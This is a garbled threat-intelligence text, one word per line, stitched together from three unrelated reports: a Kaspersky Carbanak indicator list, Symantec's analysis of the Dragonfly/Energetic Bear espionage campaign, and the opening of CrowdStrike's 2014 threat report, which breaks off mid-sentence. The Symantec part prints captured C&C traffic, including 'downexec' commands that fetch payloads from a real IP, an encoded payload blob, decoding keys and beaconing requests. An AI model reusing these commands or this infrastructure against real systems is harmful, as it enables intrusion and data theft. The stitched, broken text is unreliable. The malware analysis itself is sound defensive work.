T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG
0d0pd
HTTP/1.1
Host
:
datsun-
auto.com
MD5
:
86e48a9be62494bffb3b8e5ecb4a0310
Name
of
attachment
:
Приглашение.doc
Drops
executable
:
MD5
:
3dc8c4af51c8c367fbe7c7feef4f6744
(
Carbanak
)
Compiled
Fri
Aug
08
00:48:07
2014
MD5
:
6c7ac8dfd7bc5c2bb1a6d7aec488c298
Name
of
attachment
:
Соответствие
ФЗ-
115
от
02.07.2014г
..
doc
,
Drops
executable
:
MD5
:
cb915d1bd7f21b29edc179092e967331
(
Carbanak
)
Compiled
Tue
Apr
08
05:44:12
2014
Connects
to
:
datsun-
auto.com
/
bDqxEs
/
Ta6IPJq3zqmRY-
.5/8SgGLA-
F
/
I9CstBYT1rK7kx.440Sbtru.cgi?QVzF
=
tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-
Ucygbtzv4=f8fx
36
samples
Securelist
,
the
resource
Follow
us
for
Kaspersky
Lab
experts
'
technical
research
,
Academy
Business
Eugene
SecureList
ThreatPost
Daily
analysis
,
and
thoughts
.

Academy
Business
Eugene
ThreatPost
Daily
Kaspersky
Lab
global
Website
Eugene
Kaspersky
Blog
Daily
Business
Daily
Kaspersky
Lab
B2C
Blog
Kaspersky
Lab
B2B
Blog
Academy
Business
ThreatPost
Daily
Academy
Business
Daily
Kaspersky
Lab
security
news
service
Kaspersky
Lab
Academy
39A/3
Leningradskoe
Shosse
Moscow
,
125212
Russian
Federation
more
contact
details
Tel
:
+
7
-
495
-
797
-
8700
Fax
:
+
7
-
495
-
797
-
8709

A
cyberespionage
campaign
against
a
range
of
targets
,
mainly
in
the
energy
sector
,
gave
attackers
the
ability
to
mount
sabotage
operations
against
their
victims
.

The
attackers
,
known
to
Symantec
as
Dragonfly
,
managed
to
compromise
a
number
of
strategically
important
organizations
for
spying
purposes
and
,
if
they
had
used
the
sabotage
capabilities
open
to
them
,
could
have
caused
damage
or
disruption
to
the
energy
supply
in
the
affected
countries
.

The
Dragonfly
group
,
which
is
also
known
by
other
vendors
as
Energetic
Bear
,
are
a
capable
group
who
are
evolving
over
time
and
targeting
primarily
the
energy
sector
and
related
industries
.

They
have
been
in
operation
since
at
least
2011
but
may
have
been
active
even
longer
than
that
.

Dragonfly
initially
targeted
defense
and
aviation
companies
in
the
US
and
Canada
before
shifting
its
focus
to
US
and
European
energy
firms
in
early
2013
.

More
recent
targets
have
included
companies
related
to
industrial
control
systems
.

Dragonfly
has
used
spam
email
campaigns
and
watering
hole
attacks
to
infect
targeted
organizations
.

The
group
has
used
two
main
malware
tools
:
Trojan
.
Karagany
and
Backdoor
.
Oldrea
.

The
latter
appears
to
be
a
custom
piece
of
malware
,
either
written
by
or
for
the
attackers
.

Symantec
observed
spear
phishing
attempts
in
the
form
of
emails
with
PDF
attachments
from
February
2013
to
June
2013
.

The
email
topics
were
related
to
office
administration
issues
such
as
dealing
with
an
account
or
problems
with
a
delivery
.

Identified
targets
of
this
campaign
were
mainly
US
and
UK
organizations
within
the
energy
sector
.

In
May
2013
,
the
attackers
began
to
use
the
Lightsout
exploit
kit
as
an
attack
vector
,
redirecting
targets
from
various
websites
.

The
use
of
the
Lightsout
exploit
kit
has
continued
to
date
,
albeit
intermittently
.

The
exploit
kit
has
been
upgraded
over
time
with
obfuscation
techniques
.

The
updated
version
of
Lightsout
became
known
as
the
Hello
exploit
kit
.

A
newer
approach
used
by
the
attackers
involves
compromising
the
update
site
for
several
industrial
control
system
(
ICS
)
software
producers
.

They
then
bundle
Backdoor
.
Oldrea
with
a
legitimate
update
of
the
affected
software
.

To
date
,
three
ICS
software
producers
are
known
to
have
been
compromised
.

The
Dragonfly
attackers
used
hacked
websites
to
host
command
-
and
-
control
(
C&C
)
software
.

Compromised
websites
appear
to
consistently
use
some
form
of
content
management
system
.

The
current
targets
of
the
Dragonfly
group
,
based
on
compromised
websites
and
hijacked
software
updates
,
are
the
energy
sector
and
industrial
control
systems
,
particularly
those
based
in
Europe
.

While
the
majority
of
victims
are
located
in
the
US
,
these
appear
to
mostly
be
collateral
damage
.

That
is
,
many
of
these
computers
were
likely
infected
either
through
watering
hole
attacks
or
update
hijacks
and
are
of
no
interest
to
the
attacker
.

By
examining
victims
with
active
infections
–
where
additional
malicious
activity
has
been
detected
–
it
is
possible
to
gather
a
more
accurate
picture
of
'
true
'
victims
.

The
most
active
infections
,
as
in
Figure
2
,
are
in
Spain
,
followed
in
order
by
the
US
,
France
,
Italy
,
and
Germany
.

Dragonfly
uses
two
main
pieces
of
malware
in
its
attacks
.

Both
are
Remote
Access
Tool
(
RAT
)
type
malware
which
provide
the
attackers
with
access
and
control
of
compromised
computers
.

Dragonfly
's
favored
malware
tool
is
Backdoor
.
Oldrea
,
which
is
also
known
as
Havex
or
the
Energetic
Bear
RAT
.

Oldrea
acts
as
a
back
door
for
the
attackers
on
to
the
victim
's
computer
,
allowing
them
to
extract
data
and
install
further
malware
.

Oldrea
appears
to
be
custom
malware
,
either
written
by
the
group
itself
or
created
for
it
.

This
provides
some
indication
of
the
capabilities
and
resources
behind
the
Dragonfly
group
.

The
second
main
tool
used
by
Dragonfly
is
Trojan
.
Karagany
.

Unlike
Oldrea
,
Karagany
was
available
on
the
underground
market
.

The
source
code
for
version
1
of
Karagany
was
leaked
in
2010
.

Symantec
believes
that
Dragonfly
may
have
taken
this
source
code
and
modified
for
its
own
use
.

Symantec
found
that
the
majority
of
computers
compromised
by
the
attackers
were
infected
with
Oldrea
.

Karagany
was
only
used
in
around
5
percent
of
infections
.

The
two
pieces
of
malware
are
similar
in
functionality
and
what
prompts
the
attackers
to
choose
one
tool
over
another
remains
unknown
.

The
Dragonfly
group
has
used
at
least
three
infection
tactics
against
targets
in
the
energy
sector
.

The
earliest
method
was
an
email
spear
phishing
campaign
,
which
saw
selected
executives
and
senior
employees
in
target
companies
receive
emails
containing
a
malicious
PDF
attachment
.

Infected
emails
had
one
of
two
subject
lines
:
"
The
account
"
or
"
Settlement
of
delivery
problem
"
.

All
of
the
emails
were
from
a
single
Gmail
address
.

Figure
3
displays
the
number
of
different
recipients
per
day
.

The
spam
campaign
began
in
February
2013
and
continued
into
June
2013
.

Symantec
identified
seven
different
organizations
targeted
in
this
campaign
.

At
least
one
organization
was
attacked
intermittently
for
a
period
of
84
days
.

In
June
2013
,
the
attackers
shifted
their
focus
to
watering
hole
attacks
.

They
compromised
a
number
of
energy-
related
websites
and
injected
an
iframe
into
each
of
them
.

This
iframe
then
redirected
visitors
to
another
compromised
legitimate
website
hosting
the
Lightsout
exploit
kit
.

This
in
turn
exploited
either
Java
or
Internet
Explorer
in
order
to
drop
Oldrea
or
Karagany
on
the
victim
's
computer
.

The
fact
that
the
attackers
compromised
multiple
legitimate
websites
for
each
stage
of
the
operation
is
further
evidence
that
the
group
has
strong
technical
capabilities
.

In
September
2013
,
Dragonfly
began
using
a
new
version
of
this
exploit
kit
,
known
as
the
Hello
exploit
kit
.

The
landing
page
for
this
kit
contains
JavaScript
which
fingerprints
the
system
,
identifying
installed
browser
plugins
.

The
victim
is
then
redirected
to
a
URL
which
in
turn
determines
the
best
exploit
to
use
based
on
the
information
collected
.

Figure
4
shows
the
compromised
websites
categorized
into
their
respective
industries
.

Fifty
percent
of
identified
targets
were
energy
industry
related
and
thirty
percent
were
energy
control
systems
,
as
shown
in
Figure
4
.

A
clear
shift
in
the
attackers
targeting
can
be
seen
in
March
2014
when
energy
control
systems
become
the
primary
target
.

The
most
ambitious
attack
vector
used
by
Dragonfly
was
the
compromise
of
a
number
of
legitimate
software
packages
.

Three
different
ICS
equipment
providers
were
targeted
and
malware
was
inserted
into
the
software
bundles
they
had
made
available
for
download
on
their
websites
.

Analysis
of
the
compilation
timestamps
on
the
malware
used
by
the
attackers
indicate
that
the
group
mostly
worked
between
Monday
and
Friday
,
with
activity
mainly
concentrated
in
a
nine
-
hour
period
that
corresponded
to
a
9
am
to
6
pm
working
day
in
the
UTC
+
4
time
zone
.

The
Dragonfly
group
is
technically
adept
and
able
to
think
strategically
.

Given
the
size
of
some
of
its
targets
,
the
group
found
a
"
soft
underbelly
"
by
compromising
their
suppliers
,
which
are
invariably
smaller
,
less
protected
companies
.

Identification
of
this
group
is
based
on
the
use
of
two
malware
families
and
an
exploit
kit
.

The
malware
families
utilized
are
Backdoor
.
Oldrea
and
Trojan
.
Karagany
.

The
exploit
kit
is
known
as
Lightsout
and/or
Hello
.

Hello
is
an
updated
iteration
of
Lightsout
that
the
Dragonfly
group
began
to
use
in
September
2013
.

Use
of
Backdoor
.
Oldrea
appears
to
be
limited
to
the
Dragonfly
group
.

In
addition
,
specific
instances
of
Trojan
.

Karagany
have
been
used
by
this
group
.

Karagany
is
a
Russian
RAT
sold
on
underground
forums
.

Instances
of
this
malware
related
to
the
Dragonfly
group
are
identified
based
on
them
being
delivered
through
the
Lightsout
exploit
kit
and
also
a
particular
packer
that
this
group
used
.

Symantec
detects
the
Trojan
.
Karagany
packer
used
by
this
group
as
Trojan
.
Karagany!gen1
.

The
Lightsout
exploit
kit
is
a
simple
exploit
kit
that
is
consistently
used
to
deliver
primarily
Backdoor
.
Oldrea
and
,
in
several
instances
,
Trojan
.
Karagany
.

A
number
of
sites
that
use
content
management
systems
were
exploited
and
an
iframe
was
used
in
order
to
redirect
visitors
to
sites
hosting
the
Lightsout
exploit
kit
.

An
example
of
an
injected
iframe
can
be
seen
in
figure
7
.

The
exploit
kit
uses
browser
(
e.g.

Internet
Explorer
and
Firefox
)
and
Java
exploits
in
order
to
deliver
either
Backdoor
.
Oldrea
or
Trojan
.
Karagany
.

An
example
of
the
structure
of
the
Lightsout
exploit
kit
can
be
seen
Table
1
.

Note
that
file
names
and
exploits
used
may
vary
.

In
September
2013
,
the
Dragonfly
group
began
using
a
new
version
of
Lightsout
,
also
known
as
the
Hello
exploit
kit
.

The
JavaScript
included
in
the
landing
page
redirects
the
browser
to
a
URL
that
depends
on
the
fonts
installed
on
the
system
,
browser
add
-
ons
,
the
OS
version
,
and
the
user
agent
.

At
this
point
,
it
determines
the
best
exploit
to
use
,
based
on
the
information
provided
,
and
generates
an
appropriate
URL
to
redirect
the
user
to
the
appropriate
exploit
/
payload
.

The
following
shows
an
example
of
such
a
request
:
[
http://]compromised.example
/
wp
-
includes
/
pomo/
dtsrc.php?a=[EK
_
DETERMINED
_
PARAMETER
]
[
EK_DETERMINED_PARAMETER
]
may
be
anything
listed
in
Table
2
.

The
parameters
dwe
and
dwd
relate
to
which
payload
is
requested
for
download
,
for
example
:
The
values
of
the
[
EK_DETERMINED_PARAMETER
]
variable
may
relate
to
the
two
different
file
types
represented
by
Backdoor
.
Oldrea
and
Trojan
.

Karagany!gen1
payloads
.

Oldrea
payloads
are
DLL
files
(
URLs
end
in
"
d
"
for
DLL
?
)
while
Karagany!gen1
payloads
are
portable
executables
(
URLs
end
in
"
e
"
for
EXE
?
)
.

At
the
core
of
Backdoor
.
Oldrea
is
a
persistent
component
that
interacts
with
C&C
servers
to
download
and
execute
payloads
.

The
components
are
downloaded
by
reaching
out
to
the
C&C
server
and
performing
a
GET
request
which
returns
an
HTML
page
containing
a
base64
encoded
string
between
two
comments
marked
with
the
'
havex
'
string
.

In
this
specific
example
,
the
'
038
'
in
the
file
name
indicates
the
major
version
number
.

Post
infection
,
Backdoor
.
Oldrea
will
attempt
to
collect
system
information
such
as
OS
,
user
name
,
computer
name
,
country
,
language
,
nation
,
Internet
adapter
configuration
information
,
available
drives
,
default
browser
,
running
processes
,
desktop
file
list
,
My
Documents
,
Internet
history
,
program
files
,
and
root
of
available
drives
.

It
also
collects
data
from
Outlook
(
address
book
)
and
ICS
related
software
configuration
files
.

This
data
is
collected
and
written
to
a
temporary
file
in
an
encrypted
form
before
it
is
POST'ed
to
a
remote
C&C
server
.

The
following
are
examples
of
a
POST
request
and
a
POST
response
.

POST
request
example
:
POST
/wp08/wp
-
includes
/
dtcla.php?id=285745296322896178920098FD80
-
20&v1=038&v2=17
0393861&q=5265882854508EFCF958F979E4
HTTP/1.1
User
-
Agent
:
Mozilla/5.0
(
Windows
;
U
;
Windows
NT
6.1
;
en
-
US
)
AppleWebKit/525.19
(
KHTML
,
like
Gecko
)
Chrome/1.0.154.36
Safari/525.19
Host
:
toons.freesexycomics.com
Content
-
Length
:
0
Cache
-
Control
:
no
-
cache
POST
response
example
:
HTTP/1.1
200
OK
Date
:
We
d
,
22
Jan
2014
13:40:48
GMT
Content
-
Type
:
text
/
html
Transfer
-
Encoding
:
chunked
Connection
:
keep
-
alive
Server
:
Apache/1.3.37
(
Unix
)
Cache
-
Control
:
no
-
cache
9f65
<
html><head><mega
http
-
equiv='CACHE
-
CONTROL
'
content='NO
-
CACHE'></
head><body
>
No
data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD////////////////////////////////////
/////////4oB+93VVXu69DuN7XYzds9yt49Ques
[
...
TRUNCATED
FOR
READABILITY
]
+
yUW3zfTxWAOstsCwCckdW5
AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD
M92D/8XckU4UJBmLwyNA==havex--></body></head
>
Various
samples
process
the
C&C
responses
differently
.

In
one
example
,
the
sample
searches
for
the
data
enclosed
by
the
tag
'
havex
'
.

Once
the
data
is
found
,
it
is
decoded
using
standard
base64
+
bzip2
and
also
a
xor
layer
with
bytes
from
the
string
1312312
.

The
decoded
data
contains
a
small
header
followed
by
an
executable
MZ
-
file
.

Another
sample
was
found
to
use
standard
base64
+
reverse
xor
+
RSA-2048
for
decrypting
received
data
.

The
decrypted
data
consists
of
a
6
byte
command
concatenated
with
an
MZ
file
.

The
MZ
file
is
compressed
with
the
lzma
algorithm
.

RSA
keys
for
decryption
,
together
with
other
initial
configuration
information
,
are
stored
in
the
registry
in
base64
form
.

This
section
includes
information
about
identified
payloads
downloaded
by
Backdoor
.
Oldrea
.

The
following
is
a
brief
description
of
the
functionality
for
each
identified
component
.

Trojan
.
Karagany
is
a
back
door
used
primarily
for
recon
.

It
is
designed
to
download
and
install
additional
files
and
exfiltrate
data
.

Samples
sometimes
use
common
binary
packers
such
as
UPX
and
Aspack
on
top
of
a
custom
Delphi
binary
packer
/
protector
for
the
payload
.

Where
present
in
samples
,
the
Delphi
packer
is
configured
to
use
'
neosphere
'
as
a
key
to
decrypt
the
payload
.

The
following
is
a
brief
overview
of
the
functionality
of
Trojan
.
Karagany
.

Trojan
.
Karagany
creates
a
folder
in
the
user
APPDATA
directory
and
chooses
the
directory
name
from
the
following
list
.

It
copies
itself
in
the
created
directory
with
hidden
and
system
attributes
using
a
file
name
chosen
from
the
following
list
.

Trojan
.
Karagany
copies
itself
with
hidden
and
system
attributes
where
it
was
first
executed
as
err.log[DIGITS
]
.

It
then
copies
the
legitimate
chkdsk
utility
in
the
installation
folder
using
the
payload
file
name
but
with
a
space
before
the
file
extension
.

This
may
fool
ordinary
users
into
thinking
that
this
folder
contains
a
legitimate
application
,
for
example
PnPutil
.exe
.

Trojan
.
Karagany!gen1
may
create
the
following
additional
files
in
the
installation
folder
.

It
then
creates
a
C:\ProgramData\Mail\MailAg\gl
directory
as
a
temporary
directory
used
for
uploading
files
.

Trojan
.
Karagany
then
creates
a
link
to
itself
in
the
Startup
folder
as
an
autostart
when
the
system
restarts
.

Trojan
.
Karagany
first
checks
for
a
live
Internet
connection
by
visiting
Microsoft
or
Adobe
websites
.

It
will
only
reach
out
to
its
C&C
server
once
this
check
is
successful
.

Example
HTTP
Requests
Internet
connection
test
to
Microsoft
GET
/en
-
us
/
default.aspx
HTTP/1.1
Accept
-
Encoding
:
gzip
,
deflate
Content
-
Type
:
application
/
x
-
www
-
form
-
urlencoded
Host
:
microsoft.com
Cookie
:
MC1=V=3&GUID=<32
character
guid
>
Connection
:
Keep
-
Alive
Cache
-
control
:
no
-
cache
Internet
connection
test
to
Adobe
using
identifiant
parameter
POST
/geo
/
productid.php
HTTP/1.1
Content
-
Type
:
application
/
x
-
www
-
form
-
urlencoded
Host
:
adobe.com
...

identifiant=51032
_
175129256364
Example
POST
request
for
C&C
server
check
-
in
POST
/check
_
value.php
HTTP/1.1
User
-
Agent
:
Mozilla/4.0
(
compatible
;
MSIE
7.0
;
Windows
NT
6.1
;
.NET
CLR
2.0.50727
)
Host
:
93.188.161.235
...

identifiant=51032
_
1799883375637&version
=
i2pver
HTTP
response
example
HTTP/1.1
200
OK
Date
:
Tue
,
28
Jan
2014
05:59:58
GMT
Vary
:
Accept
-
Encoding
Content
-
Length
:
324
Content
-
Type
:
text
/
html
X
-
Powered
-
By
:
PHP/5.3.10
-
1ubuntu3.9
Via
:
1.1
host.alexsieff.com
work:3|downexec
[
http://]93.188.161.235/check2/muees27jxt
/
shot.jpg
;
work:5|downexec
[
http://]93.188.161.235/check2/muees27jxt
/
tl.jpg
;
work:7|downexec
[
http://]93.188.161.235/check2/muees27jxt
/
fl.jpg
;
work:103|downexec
[
http://]93.188.161.235/check2/muees27jxt
/
pdump.jpg
;
work:118|downexec
[
http://]93.188.161.235/check2/muees27jxt
/
fl.jpg
;
The
POST
data
contains
the
operating
system
version
and
a
derived
number
.

User
-
Agent
tokens
used
in
C&C
requests
are
hard
-
coded
.

The
following
two
examples
have
been
observed
.

Regular
expression
for
URL
or
HTTP
request
-
line
searches
.

Regular
expression
for
file
system
searches
.

Karagany
Yara
rule
:
Symantec
Security
Response
﻿﻿
Symantec
protects
the
world
's
information
and
is
the
global
leader
in
security
,
backup
,
and
availability
solutions
.

Our
innovative
products
and
services
protect
people
and
information
in
any
environment
-
from
the
smallest
mobile
device
to
the
enterprise
data
center
to
cloud
-
based
systems
.

Our
industry
-
leading
expertise
in
protecting
data
,
identities
,
and
interactions
gives
our
customers
confidence
in
a
connected
world
.

More
information
is
available
at
www.symantec.com
or
by
connecting
with
Symantec
at
go.symantec.com/socialmedia
.

Headquartered
in
Mountain
View
,
Calif.
,
Symantec
has
operations
in
40
countries
.

More
information
is
available
at
www.symantec.com
.

For
specific
country
offices
and
contact
numbers
,
please
visit
our
website
.

Symantec
World
Headquarters
350
Ellis
St.

Mountain
View
,
CA
94043
USA
+
1
(
650
)
527
-
8000
1
(
800
)
721
-
3934
www.symantec.com
Copyright
2014
Symantec
Corporation
.

All
rights
reserved
.

Symantec
,
the
Symantec
Logo
,
and
the
Checkmark
Logo
are
trademarks
or
registered
trademarks
of
Symantec
Corporation
or
its
affiliates
in
the
U.S.

and
other
countries
.

Other
names
may
be
trademarks
of
their
respective
owners
.

Any
technical
information
that
is
made
available
by
Symantec
Corporation
is
the
copyrighted
work
of
Symantec
Corporation
and
is
owned
by
Symantec
Corporation
.

NO
WARRANTY
.

The
technical
information
is
being
delivered
to
you
as
is
and
Symantec
Corporation
makes
no
warranty
as
to
its
accuracy
or
use
.

Any
use
of
the
technical
documentation
or
the
information
contained
herein
is
at
the
risk
of
the
user
.

Documentation
may
include
technical
or
other
inaccuracies
or
typographical
errors
.

Symantec
reserves
the
right
to
make
changes
without
prior
notice
.

Intelligence
powers
everything
we
do
.

Dive
into
the
top
threat
actors
,
attack
vectors
,
and
threat
intelligence
trends
of
2014
.

Intro
:
At
CrowdStrike
,
"
Intelligence
powers
everything
we
do
.
"
This
is
not
a
corporate
slogan
,
and
it
is
not
a
marketing
theme
.

It
is
the
realization
of
having
the
most
dedicated
professionals
focusing
on
solving
problems
that
have
real
strategic
,
political
,
and
financial
impact
on
our
customers
.

When
we
consider
the
problems
facing
our
customers
,
we
know
that
intelligence
allows
them
to
make
key
decisions
that
can
mean
the
difference
between
disaster
and
triumph
.

In
the
earliest
days
building
CrowdStrike
,
we
drew
heavily
on
the
concepts
encompassed
in
Colonel
John
Boyd
's
OODA
loop
(
OODA
is
an
acronym
for
Observe
,
Orient
,
Decide
,
Act
)
.

It
has
been
applied
over
the
years
to
all
manner
of
decision
-
making
situations
.

The
core
of
the
OODA
model
is
that
a
decision
-
making
process
is
broken
into
phases
,
and
in
an
adversarial
encounter
,
two
entities
will
go
through
the
same
process
.

Whichever
entity
goes
through
the
process
the
fastest
will
likely
prevail
.

The
reason
that
intelligence
powers
everything
we
do
is
that
we
seek
to
provide
our
customers
with
the
ability
to
come
to
a
decision
(
the
last
step
of
the
OODA
loop
)
before
the
adversary
does
,
thus
ensuring
a
favorable
outcome
.

In
intelligence
circles
,
this
is
often
referred
to
as
decision
advantage
,
and
when
dealing
with
adversaries
trying
to
compromise
your
enterprise
security
,
you
want
it
.

Throughout
2014
,
the
activity
monitored
by
CrowdStrike
in
the
cyber
domain
was
reflective
of
the
events
unfolding
in
the
real
world
.

This
was
punctuated
in
late
2014
with
the
now
-
infamous
attack
attributed
to
North
Korean
actors
who
levied
destructive
malware
in
a
flagrant
assault
against
a
private
entity
.

The
actor
in
this
case
,
which
CrowdStrike
has
traced
back
to
2006
,
has
a
history
of
using
destructive
code
against
its
targets
.

This
actor
again
launched
attacks
in
December
against
its
usual
adversary
,
the
Republic
of
Korea
.

The
highly
publicized
events
that
initially
suppressed
the
release
of
a
movie
deemed
offensive
by
the
Democratic
People
's
Republic
of
Korea
resulted
in
unprecedented
awareness
of
the
power
that
one
adversary
can
wield
against
a
target
if
they
are
suitably
motivated
.

This
final
chapter
in
2014
closed
out
what
was
a
year
of
attribution
and
adversary
focus
.

In
May
,
the
U.S.

Department
of
Justice
,
in
concert
with
various
partners
including
CrowdStrike
researchers
,
disrupted
the
infrastructure
of
Gameover
Zeus
,
a
prolific
Intro
:
botnet
that
was
the
scourge
of
security
practitioners
across
the
globe
.

This
disruption
,
which
also
impacted
the
nefarious
CryptoLocker
malware
,
provided
the
pause
in
adversary
activity
needed
by
law
enforcement
to
levy
charges
and
take
legal
action
to
permanently
impact
this
malware
.

In
that
same
month
,
the
U.S.

Department
of
Justice
charged
five
officers
in
the
People
's
Liberation
Army
,
the
military
organ
of
the
People
's
Republic
of
China
,
with
violating
18
U.S.

Code
1030
.

In
June
,
CrowdStrike
published
a
detailed
analysis
of
an
actor
associated
with
the
12th
Bureau
of
the
Third
General
Staff
Department
.

This
report
demonstrated
a
direct
lineage
between
malware
targeting
a
variety
of
western
technology
and
government
targets
,
and
an
individual
in
the
Chinese
intelligence
service
.

The
events
that
unfolded
in
the
South
China
Sea
near
the
Paracel
Islands
,
the
emergence
of
ISIS
,
the
unrest
in
Ukraine
,
and
the
disappearance
of
a
Malaysian
airliner
all
took
on
a
cyber
element
.

This
is
no
coincidence
.

The
nation
-
states
of
the
world
are
all
seeking
the
aforementioned
decision
advantage
,
and
they
know
that
the
use
of
interconnected
computers
allows
them
to
collect
intelligence
that
gives
them
the
ability
to
make
informed
decisions
.

Our
customers
rely
on
us
to
provide
them
intelligence
to
thwart
these
attacks
and
make
informed
decisions
.

This
report
will
provide
an
overview
of
some
of
the
intelligence
analyzed
by
the
CrowdStrike
team
over
the
past
year
.

Wrapping
so
much
analysis
into
one
report
means
a
lot
of
tough
decisions
needed
to
be
made
on
what
to
include
.

This
report
is
structured
to
provide
Key
Findings
first
.

Following
the
key
findings
are
some
graph
data
based
on
the
patterns
that
emerged
though
visibility
attained
by
the
CrowdStrike
team
;
this
is
meant
to
provide
a
snapshot
of
the
dozens
of
adversaries
tracked
this
year
.

In
the
Notable
Activity
section
,
we
cover
the
three
motivations
that
we
see
:
Criminal
,
Targeted
-
Intrusion
,
and
Hacktivist
/
Activist
.

We
explore
notable
activity
around
zero
-
day
exploits
and
event
-
specific
operations
conducted
by
these
adversaries
.

There
are
so
many
interesting
actors
we
discovered
this
year
,
and
even
more
that
advanced
from
previous
years
;
the
Know
the
Adversary
section
contains
interesting
observations
for
just
a
few
of
the
adversaries
from
the
intelligence
reports
we
publish
through
the
subscription
service
.

Finally
,
we
provide
an
analysis
of
the
2013
report
predictions
for
the
past
year
,
and
a
forecast
of
what
to
expect
in
2015
.

In
2014
,
it
became
abundantly
clear
that
threat
intelligence
would
provide
the
decisive
advantage
when
protecting
your
network
.

The
CrowdStrike
Global
Intelligence
team
observed
significant
activity
from
39
different
criminal
,
hacktivist
,
state
-
sponsored
,
and
nationalist
adversaries
.

State
of
the
Union
:
During
2014
,
CrowdStrike
Intelligence
observed
significant
activity
from
39
state
-
sponsored
and
nationalist
adversaries
targeting
numerous
verticals
all
over
the
globe
.

The
charts
below
provide
a
high
-
level
illustration
of
this
targeting
.

There
are
a
few
takeaways
from
this
data
.

Vietnam
and
GOBLIN
PANDA
were
respectively
the
most
targeted
country
and
the
most
active
adversary
.

From
late
spring
through
summer
,
GOBLIN
PANDA
conducted
consistent
targeted
intrusion
operations
targeting
organizations
in
Vietnam
focused
on
tensions
in
the
South
China
Sea
.

These
campaigns
relied
primarily
on
spear
phishing
with
malicious
documents
that
dropped
malware
(
mostly
PlugX
)
along
with
Vietnamese-
language
decoy
documents
.

The
content
of
these
decoys
often
came
from
documents
produced
by
Vietnam
's
government
,
which
indicates
that
the
adversary
possibly
infiltrated
the
government
's
network
and
was
using
stolen
documents
in
its
operations
.

The
frequency
of
GOBLIN
PANDA
's
operations
,
and
targeted
activity
aimed
at
Vietnam
in
general
,
tailed
off
in
the
final
months
of
2014
,
but
the
volume
of
activity
in
spring
and
summer
was
enough
to
push
them
to
the
top
of
CrowdStrike
's
targeting
stats
.

Observed
Adversary
Activity
During
2014
State
of
the
Union
:
Significant
Targeting
by
Country
in
2014
PlugX
was
by
far
the
most
used
malware
variant
for
targeted
activity
during
2014
.

It
proliferated
greatly
amongst
China
-
based
targeted
intrusion
adversaries
and
now
appears
to
be
the
tool
of
choice
for
many
.

The
malware
has
been
around
for
years
and
has
been
used
by
multiple
Chinese
actors
for
quite
some
time
;
however
,
the
frequency
of
PlugX
use
during
2014
revealed
just
how
prominent
it
is
.

PlugX
is
used
by
both
more
advanced
China
-
based
adversaries
such
as
AURORA
PANDA
and
adversaries
of
a
lower
level
of
sophistication
such
as
GOBLIN
PANDA
.

The
reason
for
its
prevalence
is
not
clear
.

It
is
possible
that
there
is
a
central
malware
dissemination
channel
supplying
many
Chinese
adversaries
and
this
is
why
so
many
groups
are
now
using
it
.

It
is
also
possible
that
groups
not
using
it
in
the
past
were
more
recently
able
to
obtain
it
via
the
underground
or
public
malware
repositories
.

State
of
the
Union
.

The
stats
below
also
reflect
a
wide
range
of
other
malicious
cyber
activity
associated
with
numerous
other
events
.

The
conflict
in
Ukraine
resulted
in
targeted
intrusion
and
other
activity
from
both
Russia
-
based
and
China-
based
adversaries
.

Adversaries
with
a
nexus
to
Iran
were
also
very
active
in
2014
targeting
western
government
entities
as
well
as
private
organizations
,
particularly
in
the
defense
sector
.

Elections
were
also
heavily
targeted
in
2014
both
in
Ukraine
and
in
Hong
Kong
,
where
the
Umbrella
Revolution
garnered
a
great
deal
of
attention
from
Chinese
actors
.

These
and
a
number
of
other
topics
are
covered
in
more
detail
in
the
sections
below
.

Financial
crime
malware
changed
the
threat
landscape
,
point
-
of-
sale
malware
became
increasingly
prevalent
,
and
China
-
based
adversaries
continued
to
proliferate
in
the
targeted
intrusion
space
.

Notable
Activity
Criminal
Cybercrime
Trends
in
2014
2014
was
an
extremely
active
year
for
cybercrime
.

Financial
Trojans
grew
in
both
complexity
and
penetration
.

Two
major
banking
botnets
–
Gameover
Zeus
(
GOZ
)
and
Shylock
–
dominated
the
first
half
of
the
year
.

Their
development
focused
on
the
ability
to
deliver
complex
web
injection
scripts
used
to
overcome
two
-
factor
authentication
and
online
banking
security
.

Two
large
,
successful
disruptions
were
mounted
mid
-
year
with
CrowdStrike
assisting
in
a
June
takeover
of
GOZ
(
see
the
next
section
)
,
and
in
Shylock
being
taken
down
in
July
.

For
some
time
,
this
left
a
void
in
this
space
,
but
adversaries
were
very
quick
to
adapt
.

With
many
services
that
catered
to
GOZ
and
Shylock
still
in
operation
,
it
was
inevitable
other
botnets
would
step
up
to
the
plate
.

CrowdStrike
is
now
observing
two
new
major
contenders
in
this
space
:
Dyreza
and
Dridex
,
also
known
as
Bugat
.

Dyreza
takes
a
more
simplistic
approach
to
banking
fraud
,
acting
to
intercept
logins
and
perform
malicious
actions
by
acquiring
the
HTTP
POST
data
from
under
banking
SSL
sessions
.

Dridex
uses
the
classic
banking
Trojan
tactic
of
relying
on
complex
JavaScript
web
injects
targeted
at
the
institutions
it
wishes
to
steal
from
.

Both
threats
rely
on
the
same
criminal
ecosystem
as
their
predecessors
.

Upatre
,
a
loader
previously
used
for
delivering
GOZ
,
is
now
being
used
to
deliver
Dyreza
,
and
known
loaders
such
as
Andromeda
,
Smoke
Loader
,
and
Pony
Loader
continue
to
be
developed
in
order
to
deliver
these
primary
payloads
.

The
Cutwail
and
Pushdo
botnets
,
previously
tasked
with
distributing
loaders
for
GOZ
,
have
since
been
retasked
,
and
,
alongside
other
spamming
botnets
,
are
now
delivering
a
number
of
phishing
lures
that
ultimately
lead
to
the
infection
with
persistent
payloads
.

Dridex
,
for
example
,
favors
Word
documents
with
obfuscated
macros
.

These
macros
,
if
allowed
to
execute
,
will
reach
out
and
download
first
-
stage
loaders
that
will
then
install
the
Dridex
payload
onto
the
victim
machine
.

Notable
Activity
In
addition
to
the
changing
banking
Trojan
landscape
,
ransomware
has
also
undergone
a
major
shift
throughout
2014
-
in
particular
becoming
much
more
professionally
organized
.

CryptoLocker
's
success
made
it
the
first
ransomware
variant
to
make
it
into
prime
-
time
news
.

Its
success
was
,
in
part
,
due
to
its
wide
distribution
,
acting
as
an
alternative
revenue
stream
for
the
operators
of
GOZ
.

When
GOZ
was
dismantled
,
CryptoLocker
was
also
taken
down
,
but
now
in
its
place
many
other
copycat
ransomware
families
are
trying
to
replicate
its
success
,
such
as
CryptoWall
and
TorrentLocker
.

So
what
is
to
be
expected
for
the
